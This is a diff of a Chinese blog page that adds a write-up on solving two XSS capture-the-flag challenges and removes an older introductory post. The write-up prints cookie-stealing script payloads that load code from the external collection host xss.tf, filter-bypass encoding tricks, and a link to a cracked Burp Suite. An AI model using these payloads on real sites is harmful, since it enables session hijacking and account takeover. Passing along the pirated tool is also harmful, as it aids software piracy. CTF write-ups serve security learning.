@@ -159,6 +159,99 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XSS 题目解析（上篇）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/09/XSS 题目解析（上篇）/">XSS 题目解析（上篇）</a>
+    </h1>
+  
+
+        
+        <a href="/2019/04/09/XSS 题目解析（上篇）/" class="archive-article-date">
+  	<time datetime="2019-04-09T04:03:33.734Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在开始解题之前先说一下什么是<strong>Proof Of Work</strong>，一会会用到。<br><img src="https://img-blog.csdnimg.cn/20190409094634623.png" alt="在这里插入图片描述"><br><strong>Proof Of Work</strong> 简称<strong>POW</strong>中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from itertools import count</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5(s):</span><br><span class="line">    return hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in count(100000):</span><br><span class="line">    if md5(str(i)).startswith(&apos;49ab02&apos;):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p>使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。</p>
+<p>知道了怎么获取这个验证码现在开始解题。</p>
+<p><strong>第一题：Baby XSS</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20190409101100263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下<br><img src="https://img-blog.csdnimg.cn/20190409101427118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>果然不行，提示你不是admin。那么既然如此我们就需要获取admin的身份。由此想到获取admin的<strong>cookies</strong>然后通过<strong>Burp Suite</strong>工具修改登录时的cookies就可以了。</p>
+<p>现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。</p>
+<p>先试探一下目标有没有设置过滤机制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/201904091019554.png" alt="在这里插入图片描述"><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="https://img-blog.csdnimg.cn/2019040910211186.png" alt="在这里插入图片描述"><br>看来代码被原样执行了，没有做过滤处理。</p>
+<p>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="https://img-blog.csdnimg.cn/20190409103543422.png" alt="在这里插入图片描述"><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190409103706460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们选择直接插入script标签的方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。<br><img src="https://img-blog.csdnimg.cn/20190409104803299.png" alt="在这里插入图片描述"><br>成功钓到了admin，展开后可以看到cookies。<br><img src="https://img-blog.csdnimg.cn/20190409104945464.png" alt="在这里插入图片描述"><br>接下来就很简单了使用<strong>Burp Suite</strong>修改cookies就可以了。我给出一个永久破解版的<strong>Burp Suite</strong>但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：<a href="https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q</a>   提取码：qun1 </p>
+<p><img src="https://img-blog.csdnimg.cn/20190409105610992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先在Proxy中的option里面添加一个代理地址和端口。然后把你的浏览器代理服务设置成这个地址端口即可。代理服务设置详见<a href="https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/">https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20190409105848129.png" alt="在这里插入图片描述"><br>开启intercept后，再点一下admin.php。<br><img src="https://img-blog.csdnimg.cn/20190409110035713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把cookies改成刚才获取到的cookies再点forward。<br><img src="https://img-blog.csdnimg.cn/20190409110151398.png" alt="在这里插入图片描述"><br>flag到手。</p>
+<p><strong>第二题：XSS 1</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20190409110301547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目说xss.php比较脆弱，请通过URL给admin发送请求捕获admin的cookies，里面包含了flag。</p>
+<p>先点开xss.php看一下。<br><img src="https://img-blog.csdnimg.cn/201904091104565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从给出的php代码中可以看出来对提交信息里面的” 、&lt;、&gt; 三个符号进行了过滤。先随便提交点东西试试。<br><img src="https://img-blog.csdnimg.cn/20190409110746729.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190409110801644.png" alt="在这里插入图片描述"><br>从提交情况来看，我们的代码放到了script标签里面并被定义成一个字符串变量。很容易想到用”符号构造闭合语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);//</span><br></pre></td></tr></table></figure>
+<p>如果这段代码可以成插入，那么script标签将会变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var  a=&quot;&quot;;alert(1);//&apos;;</span><br></pre></td></tr></table></figure>
+<p>实验<br><img src="https://img-blog.csdnimg.cn/20190409111128796.png" alt="在这里插入图片描述"><br>果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。</p>
+<p>看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。</p>
+<p>可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。</p>
+<p>使用编码工具对上面的语句进行转码。<br><img src="https://img-blog.csdnimg.cn/20190409112718557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把编码后的内容提交一下看看。<br><img src="https://img-blog.csdnimg.cn/20190409112806526.png" alt="在这里插入图片描述"><br>OK，成功执行。<br><img src="https://img-blog.csdnimg.cn/20190409112832640.png" alt="在这里插入图片描述"><br>那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。<br><img src="https://img-blog.csdnimg.cn/20190409113449125.png" alt="在这里插入图片描述"><br>可以看到灰色的script标签并没有被解析。所以我们只能使用write()或者createElement()方法来把script写到body里面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">document.write(&quot;&lt;sCrIpt srC=http://xss.tf/Vw6&gt;&lt;/sCRipT&gt;&quot;);</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+<p>编码之后写入表单可以看到<br><img src="https://img-blog.csdnimg.cn/20190409114626412.png" alt="在这里插入图片描述"><br>script标签被加到了svg里面，无法引用外部 js。我们需要在body里面创建标签。所以使用createElement()方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+<p>写入之后发现<br><img src="https://img-blog.csdnimg.cn/20190409115000620.png" alt="在这里插入图片描述"><br>OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。</p>
+<p>回到题目页面把你<strong>编码后</strong>的代码放到示例URL后面<br><img src="https://img-blog.csdnimg.cn/2019040911535037.png" alt="在这里插入图片描述"><br>提交后发现<br><img src="https://img-blog.csdnimg.cn/20190409115611316.png" alt="在这里插入图片描述"><br>代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。<br><img src="https://img-blog.csdnimg.cn/20190409115933536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提交编码。<br><img src="https://img-blog.csdnimg.cn/20190409120223157.png" alt="在这里插入图片描述"><br>flag在cookies里面。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/04/09/XSS 题目解析（上篇）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-XSS 随笔 03" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -813,81 +906,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/04/04/关于Python的使用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-first blog" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/03/first blog/">First Article</a>
-    </h1>
-  
-
-        
-        <a href="/2019/04/03/first blog/" class="archive-article-date">
-  	<time datetime="2019-04-03T12:24:54.992Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>早上看了一下之前的Github实在是不忍直视<br><img src="https://img-blog.csdnimg.cn/20190403201220137.jpg" alt="在这里插入图片描述"><br>还是重新制作一个吧。<br>使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。<br>偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。<br>下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。</p>
-<p>既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。<img src="https://img-blog.csdnimg.cn/2019040320224889.gif" alt="在这里插入图片描述"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/03/first blog/">展开全文 >></a>
         </p>
       
 
